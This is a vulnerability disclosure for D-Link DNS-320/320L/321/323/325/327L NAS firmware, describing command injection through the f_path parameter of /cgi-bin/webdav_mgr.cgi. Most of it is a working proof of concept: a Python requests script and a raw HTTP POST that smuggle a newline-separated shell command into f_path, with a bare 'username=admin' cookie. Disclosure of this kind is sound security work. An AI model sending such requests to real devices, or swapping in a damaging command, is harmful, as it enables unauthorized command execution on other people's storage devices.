# Overview
Firmware download website:
 [https://ftp.dlink.ru/pub/NAS/](https://ftp.dlink.ru/pub/NAS/)
# Affected version
DLINK DNS-320/320L/321/323/325/327L all versions of the firmware
# Vulnerability details
The DLINK nas DNS-320/320L/321/323/325/327L  all firmware version has a command injection vulnerability in webdav_mgr function of the file /cgi-bin/webdav_mgr.cgi.  The variable `f_path`is passed from a POST request and is assigned to `v3` via the `sprintf` function at line 17 and invoked by the `system` command, it can lead to command execution. 
![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723738184599-d124d55a-a400-45cf-8260-9e9c763f5863.png#averageHue=%23fafaf5&clientId=uca8b19a4-e5dd-4&from=paste&height=192&id=uNHBy&originHeight=192&originWidth=885&originalType=binary&ratio=1&rotation=0&showTitle=false&size=29368&status=done&style=none&taskId=u887fa7b2-346a-4c8d-b6e5-77d61769669&title=&width=885)
# POC
```java
import requests

url = "http://192.168.0.32/cgi-bin/webdav_mgr.cgi"
headers = {
    "Host": "192.168.0.32",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.32",
    "Connection": "close",
    "Referer": "http://192.168.0.32/photo_center/index.html",
    "Cookie": "username=admin",
    "Priority": "u=1"
}

data = "cmd=Webdav_Account_Info&f_path=%0atouch%09/tmp/0022%0a"
response = requests.post(url, headers=headers, data=data)
print(response.text)
```

```java
POST /cgi-bin/webdav_mgr.cgi HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded 
X-Requested-With: XMLHttpRequest
Content-Length: 54
Origin: http://192.168.0.32
Connection: close
Cookie: username=admin
Priority: u=1

cmd=Webdav_Account_Info&f_path=%0atouch%09/tmp/0022%0a
```


